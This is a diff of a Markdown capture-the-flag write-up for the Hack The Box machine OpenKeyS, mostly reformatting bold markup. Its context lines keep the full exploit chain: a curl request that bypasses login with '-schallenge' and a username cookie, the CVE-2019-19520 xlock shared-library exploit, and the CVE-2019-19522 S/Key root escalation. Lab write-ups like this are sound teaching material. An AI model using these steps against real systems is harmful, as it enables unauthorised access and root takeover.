@@ -1,11 +1,7 @@
 ![](openkeys_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
-
-||
-|-----------|
-|Start with the nmap found web server on port 80. Enumeration of the server using __GoBuster__ reveals a __Vim swap file__. This contains the code that the website uses for authentication, and was last edited by a user called __Jennifer__. Another file found from gobuster is  the `check_auth` binary which uses the OpenBSD authentication framework. This version of the authentication frameworkis found vulnerable for authentication bypass, and after successful exploitation the login page is bypassed. Due to insecure PHP coding, it is possible to set the username to Jennifer through the usage ofcookies, and acquire SSH credentials. Enumeration from jennifer's shell confirms that the __OS version__ in useto be __6.6__ which is vulnerable to a __privilege escalation exploit__.  Attackers can leverage the file/usr/X11R6/bin/xlock to become a member of the __auth group__, after which they can leveragethe __S/Key authentication__ option to add an entry for the root user and escalate their privileges.|
 
 # Scanning
 
@@ -21,7 +17,7 @@ Device type: general purpose|firewall
 Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%)
 ```
 
-* __OS :__ OpenBSD
+* **OS :** OpenBSD
 
 ## Web_server
 
@@ -33,7 +29,7 @@ Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%)
 
 * 10.10.10.199 on port 80 has a login page
 
-  __Title :__ OpenKeyS - Retrieve your OpenSSH Keys
+  **Title :** OpenKeyS - Retrieve your OpenSSH Keys
 
 * http://10.10.10.199/includes/
 
@@ -44,13 +40,13 @@ Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%)
 	  auth.php.swp                                       17-Jun-2020 14:57               12288
 
 * Swap file created by the Vi text editor or one of its variants such as Vim (Vi iMproved) and gVim; stores the recovery version of a file that is being edited in the program; also serves as a lock file so that no other Vi editing session can concurrently write to the file.
-* `strings` auth.php.swp get a __username: jennifer__
+* `strings` auth.php.swp get a **username: jennifer**
 
-* __Recover `auth.php` file__
+* **Recover `auth.php` file**
 
 	`vim -r auth.php.swp`
 	
-  __Inside [auth.php](dump/auth.php) file__	
+  **Inside [auth.php](dump/auth.php) file**	
 
 	  function authenticate($username, $password)
 	  {
@@ -66,18 +62,18 @@ Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%)
 
 	    -rw-r--r-- 1 x00tex x00tex 12288 Oct 14 10:21 check_auth
 
-* __[check_auth](dump/check_auth) file__
+* **[check_auth](dump/check_auth) file**
 
 * file is not excuting in linux because it made form OpenBSD.
 * i search for `OpenBSD check_auth` and found Authentication Bypass and Local Privilege Escalation Vulnerabilities.
 
 # User Exploit
 
-__Exploit :__ CVE-2019-19521 (Authentication Bypass)
+**Exploit :** CVE-2019-19521 (Authentication Bypass)
 
-__Report :__ [qualys.com](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt)
+**Report :** [qualys.com](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt)
 
-__Exploit surface:__ if an attacker specifies the username "-schallenge" (or "-schallenge:passwd" to force a passwd-style authentication), then the authentication is automatically successful and therefore bypassed.
+**Exploit surface:** if an attacker specifies the username "-schallenge" (or "-schallenge:passwd" to force a passwd-style authentication), then the authentication is automatically successful and therefore bypassed.
 
 * but still getting Authentication denied error
 * i don't find the use of username that i found and when using `-schallenge` as username it gives an error 
@@ -104,7 +100,7 @@ __Exploit surface:__ if an attacker specifies the username "-schallenge" (or "-s
 
 	`curl -L http://10.10.10.199/index.php -d "username=-schallenge&password=password" -b "PHPSESSID=qqe08df89r71d7jb7i869857uh;username=jennifer"`
 
-  __output__, get ssh_key for user jennifer
+  **output**, get ssh_key for user jennifer
   
 	  OpenSSH key for user jennifer
 	  
@@ -133,17 +129,17 @@ openkeys$ uname -a
 OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
 ```
 
-__OpenBSD version :__ 6.6
+**OpenBSD version :** 6.6
 
-__Local Exploit :__ CVE-2019-19520: Local privilege escalation via xlock *from that same "qualys" report*
+**Local Exploit :** CVE-2019-19520: Local privilege escalation via xlock *from that same "qualys" report*
 
-__vulnerability :__ On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is set-group-ID "auth", not set-user-ID; the following check is therefore incomplete and should use issetugid() instead, A local attacker can exploit this vulnerability and dlopen() their own driver to obtain the privileges of the group "auth".
+**vulnerability :** On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is set-group-ID "auth", not set-user-ID; the following check is therefore incomplete and should use issetugid() instead, A local attacker can exploit this vulnerability and dlopen() their own driver to obtain the privileges of the group "auth".
 
-__Local Exploit :__ CVE-2019-19522: Local privilege escalation via S/Key and YubiKey *from that same "qualys" report*
+**Local Exploit :** CVE-2019-19522: Local privilege escalation via S/Key and YubiKey *from that same "qualys" report*
 
-__vulnerability :__ If the S/Key or YubiKey authentication type is enabled, then a local attacker can exploit the privileges of the group "auth" to obtain the full privileges of the user "root"
+**vulnerability :** If the S/Key or YubiKey authentication type is enabled, then a local attacker can exploit the privileges of the group "auth" to obtain the full privileges of the user "root"
 
-* so there are two exploit to get root __First__ get into __"auth"__ group using CVE-2019-19520 and __then__ get __"root"__ using CVE-2019-19522
+* so there are two exploit to get root **First** get into **"auth"** group using CVE-2019-19520 and **then** get **"root"** using CVE-2019-19522
 
 # Root Exploit
 
@@ -155,7 +151,7 @@ __vulnerability :__ If the S/Key or YubiKey authentication type is enabled, then
 
 ### CVE-2019-19520
 
-__First__, create `swrast_dri.c` file - 
+**First**, create `swrast_dri.c` file - 
 ```
 openkeys$ cat > swrast_dri.c << "EOF"
 #include <paths.h>
@@ -174,7 +170,7 @@ static void __attribute__ ((constructor)) _init (void) {
 EOF
 ```
 
-__Second__, compile it - 
+**Second**, compile it - 
 ```diff
 openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c
 
@@ -182,7 +178,7 @@ openkeys$ ls
 swrast_dri.c  swrast_dri.so
 ```
 
-__Third__, run - 
+**Third**, run - 
 ```diff
 openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
 [1] 56546
@@ -196,13 +192,13 @@ openkeys$ id
 
 ### CVE-2019-19522
 
-__First__, create root skey and chmod it - 
+**First**, create root skey and chmod it - 
 ```
 openkeys$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
 openkeys$ chmod 0600 /etc/skey/root
 ```
 
-__Second__, run - 
+**Second**, run - 
 ```
 $ env -i TERM=vt220 su -l -a skey
 otp-md5 99 obsd91335
@@ -211,7 +207,7 @@ openkeys# whoami
 root
 ```
 
-__Root shell__
+**Root shell**
 ```
 openkeys# whoami                                               
 root
